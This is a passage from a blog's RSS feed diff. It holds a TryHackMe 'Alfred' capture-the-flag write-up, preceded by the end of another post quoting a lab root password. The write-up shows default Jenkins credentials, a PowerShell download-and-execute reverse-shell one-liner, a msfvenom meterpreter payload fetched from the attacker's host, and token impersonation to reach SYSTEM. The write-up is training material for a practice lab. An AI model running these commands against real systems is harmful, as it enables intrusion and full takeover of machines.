+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them &lt;span class="k">if&lt;/span> you
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">need access to the root user account.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root:tr0ub13guM!@#123
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>Alfred Writeup THM</title><link>https://simonefelici.github.io/p/alfred-writeup-thm/</link><pubDate>Tue, 26 Dec 2023 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/alfred-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Alfred-writeup-THM/main/03c7fd6c-be68-4659-9c82-37743811ebdb_Export-f74cfa2b-d9f8-4ed2-b2f2-f5d8cdd8251d/Alfred%20ebebc7814aa2443aac5154421745f1d8/Untitled.png" alt="Featured image of post Alfred Writeup THM" />&lt;h2 id="initial-access">Initial Access
+&lt;/h2>&lt;p>Exploiting Jenkins,&lt;/p>
+&lt;p>Jenkins is a tool used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it.&lt;/p>
+&lt;p>First of all I am going to scan the machine, for this I only know that the machine does not respond to ping, and I only need TCP ports,&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sT -Pn 10.10.207.2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-26 10:41 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.207.2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.058s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">997&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8080/tcp open http-proxy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 5.65 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This is the output.&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Port 80 is hosting a site, which tells me important informations:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Alfred-writeup-THM/main/03c7fd6c-be68-4659-9c82-37743811ebdb_Export-f74cfa2b-d9f8-4ed2-b2f2-f5d8cdd8251d/Alfred%20ebebc7814aa2443aac5154421745f1d8/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>I got a possible username and password: Bruce Wayne&lt;/p>
+&lt;p>And an email: &lt;a class="link" href="mailto:alfred@wayneenterprises.com" >alfred@wayneenterprises.com&lt;/a>&lt;/p>
+&lt;p>But that’s it for now.&lt;/p>
+&lt;p>Port 8080 is where Jenkins is hosted.&lt;/p>
+&lt;p>Upon entering the page, there is a login portal, after trying “Bruce Wayne” and several other password, I am reminded that this is in the description of the room:&lt;/p>
+&lt;p>“common misconfiguration on a widely used automation server”&lt;/p>
+&lt;p>So i tried admin:admin, which worked.&lt;/p>
+&lt;p>Now I got control over Jenkins!&lt;/p>
+&lt;p>The first thing to do is searching for some type of tool that I can use to get a reverse shell:&lt;/p>
+&lt;p>&lt;a class="link" href="https://github.com/samratashok/nishang" target="_blank" rel="noopener"
+>https://github.com/samratashok/nishang&lt;/a>&lt;/p>
+&lt;p>First I tried with the script console.&lt;/p>
+&lt;p>But it didn’t work because it can’t download the script like that, so I found a configure page under the project.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Alfred-writeup-THM/main/03c7fd6c-be68-4659-9c82-37743811ebdb_Export-f74cfa2b-d9f8-4ed2-b2f2-f5d8cdd8251d/Alfred%20ebebc7814aa2443aac5154421745f1d8/Untitled%201.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Because it has RDP open we can assume that the machine is running Windows.&lt;/p>
+&lt;p>I am going to use this script: “https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1”&lt;/p>
+&lt;p>Which I downloaded in my machine, after that I started a python server: (this will be started in the same directory as the script, that’s because jenkins will download the script thanks to the python server)&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 -m http.server &lt;span class="m">8000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then I start a listener:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And then used this script in the script console:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">*powershell iex &lt;span class="o">(&lt;/span>New-Object Net.WebClient&lt;span class="o">)&lt;/span>.DownloadString&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;http://your-ip:your-python-server-port/Invoke-PowerShellTcp.ps1&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>Invoke-PowerShellTcp -Reverse -IPAddress 10.18.20.116 -Port 4444*
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After that I build the config we got a shell!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.207.2&lt;span class="o">]&lt;/span> &lt;span class="m">49236&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Windows PowerShell running as user bruce on ALFRED
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Copyright &lt;span class="o">(&lt;/span>C&lt;span class="o">)&lt;/span> &lt;span class="m">2015&lt;/span> Microsoft Corporation. All rights reserved.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\P&lt;/span>rogram Files &lt;span class="o">(&lt;/span>x86&lt;span class="o">)&lt;/span>&lt;span class="se">\J&lt;/span>enkins&lt;span class="se">\w&lt;/span>orkspace&lt;span class="se">\p&lt;/span>roject&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We can see that we are the user alfred\bruce&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\P&lt;/span>rogram Files &lt;span class="o">(&lt;/span>x86&lt;span class="o">)&lt;/span>&lt;span class="se">\J&lt;/span>enkins&lt;span class="se">\w&lt;/span>orkspace&lt;span class="se">\p&lt;/span>roject&amp;gt;whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">alfred&lt;span class="se">\b&lt;/span>ruce
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now I need the user flag, which I found in the user Desktop:&lt;/p>
+&lt;p>PS C:\Users\bruce\Desktop&amp;gt; ls&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\b&lt;/span>ruce&lt;span class="se">\D&lt;/span>esktop&amp;gt; ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Directory: C:&lt;span class="se">\\&lt;/span>Users&lt;span class="se">\\&lt;/span>bruce&lt;span class="se">\\&lt;/span>Desktop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Mode LastWriteTime Length Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">a--- 10/25/2019 11:22 PM &lt;span class="m">32&lt;/span> user.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now, I am going to switch this scuffed revshell in an imrpoved version, we can do this using the meterpreter shell.&lt;/p>
+&lt;h2 id="upgrading-the-shell">Upgrading the shell
+&lt;/h2>&lt;p>Leave your previous connection &lt;strong>OPEN&lt;/strong>.&lt;/p>
+&lt;p>We create our payload:&lt;/p>
+&lt;p>&lt;code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.20.116 LPORT=4555 -f exe -o revshellps1.exe&lt;/code>&lt;/p>
+&lt;p>After creating this payload, download it to the machine using the same method in the previous step:&lt;/p>
+&lt;p>&lt;code>powershell &amp;quot;(New-Object System.Net.WebClient).Downloadfile('http://10.18.20.116:8000/revshellps1.exe','revshellps1.exe')&amp;quot;&lt;/code>&lt;/p>
+&lt;p>Now that we have done that, we need to use Metasploit:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">**use exploit/multi/handler**
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using configured payload generic/shell_reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">set&lt;/span> PAYLOAD windows/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">PAYLOAD&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; windows/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">set&lt;/span> LHOST Your_Machine_IP
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.18.20.116
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">set&lt;/span> LPORT Your_Port&lt;span class="o">(&lt;/span>Same as the one you used &lt;span class="k">for&lt;/span> creating the payload&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LPORT&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">4555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Once we run, we nee to go in our previous connection(The one we created with nc) and start the process:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Start-Process &lt;span class="s2">&amp;#34;shell-name.exe”
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>You will find the shell under: &lt;code>C:\Program Files (x86)\Jenkins\workspace\project&lt;/code>&lt;/p>
+&lt;p>Now that we have a stable shell, we can try to gain major privileges!&lt;/p>
+&lt;h2 id="privilege-escalation">Privilege Escalation
+&lt;/h2>&lt;p>First thing we do is:&lt;/p>
+&lt;p>&lt;code>whoami /priv&lt;/code>&lt;/p>
+&lt;p>With this we can see all the Enabled privileges&lt;/p>
+&lt;p>(SeDebugPrivilege, SeImpersonatePrivilege) Those are the one that we find interessing.&lt;/p>
+&lt;p>Then we check for the available tokens:&lt;/p>
+&lt;p>&lt;code>impersonate_token&lt;/code>&lt;/p>
+&lt;p>And we can see the BUILTIN\Administrators token available&lt;/p>
+&lt;p>So we try to impersonate the token:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">meterpreter &amp;gt; impersonate_token &lt;span class="s2">&amp;#34;BUILTIN\Administrators&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Warning: Not currently running as SYSTEM, not all tokens will be available
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Call rev2self &lt;span class="k">if&lt;/span> primary process token is SYSTEM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Delegation token available
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Successfully impersonated user **NT AUTHORITY&lt;span class="se">\S&lt;/span>YSTEM**
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Even though you have a higher privileged token, you may not have the permissions of a privileged user.&lt;/p>
+&lt;p>To go around that we can migrate to a process with the correct privileges.&lt;/p>
+&lt;p>First we use &lt;code>ps&lt;/code> to view the processes, then we grab the PID of services.exe, which we pick because is it normally a ssafe option.&lt;/p>
+&lt;p>and we migrate to that PID:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">migrate PID-OF-PROCESS
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now we should have full SYSTEM privileges!!&lt;/p></description></item></channel></rss>
